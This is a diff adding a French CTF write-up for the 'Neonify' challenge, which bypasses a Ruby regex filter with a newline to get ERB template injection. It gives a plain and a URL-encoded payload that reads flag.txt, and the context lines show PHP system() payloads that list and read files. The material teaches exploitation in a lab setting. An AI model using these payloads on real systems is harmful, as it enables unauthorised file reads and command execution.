@@ -63,3 +63,39 @@ Ce payload encodé en Base64 fonctionne et nous sort les logs du serveur. L'user
     <?php system('ls /'); ?>
     <?php system('cat /flag_K61S1'); ?>
 
+## Neonify 
+
+Le site ne contient qu'une simple page permettant de renvoyer du texte en version fluo. 
+
+Dans le code source de cette page on remarque le morceau suivant : 
+
+    <h1 class="glow"><%= @neon %></h1>
+    
+Cela ressemble à un point d'entrée pour une SSTI. 
+
+Toutefois, la plupart des payloads classiques de SSTI sont rejetés. En vérifiant le code source du back-end, on observe un filtre par expression régulière : 
+
+    post '/' do
+        if params[:neon] =~ /^[0-9a-z ]+$/i
+          @neon = ERB.new(params[:neon]).result(binding)
+        else
+          @neon = "Malicious Input Detected"
+        end
+        erb :'index'
+      end
+
+Utiliser '^' et '$' comme délimiteurs en Ruby est une erreur, puisqu'ils s'arrêtent à la ligne courante et peuvent être contournés par les retours à la ligne.
+
+Voir : https://davidhamann.de/2022/05/14/bypassing-regular-expression-checks/
+
+Payload en clair contenant un retour à la ligne et une commande de lecture du flag : 
+
+    ABCDE\n
+    <%= File.open('flag.txt').read %>
+    
+Attention à bien encoder tous les caractères spéciaux et notamment le retour à la ligne.
+
+Payload final : 
+
+    ABCDE%0a
+    <%25%3d+File.open('flag.txt').read+%25>
